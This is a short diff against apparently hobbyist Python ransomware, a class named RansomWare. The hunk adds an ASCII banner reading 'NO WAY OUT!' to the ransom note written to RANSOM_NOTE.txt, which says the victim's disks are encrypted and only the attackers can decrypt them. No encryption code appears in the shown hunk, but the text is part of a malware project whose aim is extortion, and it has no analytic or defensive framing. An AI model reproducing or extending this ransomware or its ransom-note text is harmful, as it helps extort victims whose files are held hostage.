@@ -149,6 +149,20 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
+███╗░░██╗░█████╗░  ░██╗░░░░░░░██╗░█████╗░██╗░░░██╗
+████╗░██║██╔══██╗  ░██║░░██╗░░██║██╔══██╗╚██╗░██╔╝
+██╔██╗██║██║░░██║  ░╚██╗████╗██╔╝███████║░╚████╔╝░
+██║╚████║██║░░██║  ░░████╔═████║░██╔══██║░░╚██╔╝░░
+██║░╚███║╚█████╔╝  ░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░
+╚═╝░░╚══╝░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░
+
+░█████╗░██╗░░░██╗████████╗██╗
+██╔══██╗██║░░░██║╚══██╔══╝██║
+██║░░██║██║░░░██║░░░██║░░░██║
+██║░░██║██║░░░██║░░░██║░░░╚═╝
+╚█████╔╝╚██████╔╝░░░██║░░░██╗
+░╚════╝░░╚═════╝░░░░╚═╝░░░╚═╝
+
 The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
 There is no way to restore your data without a special key.
 Only we can decrypt your files!
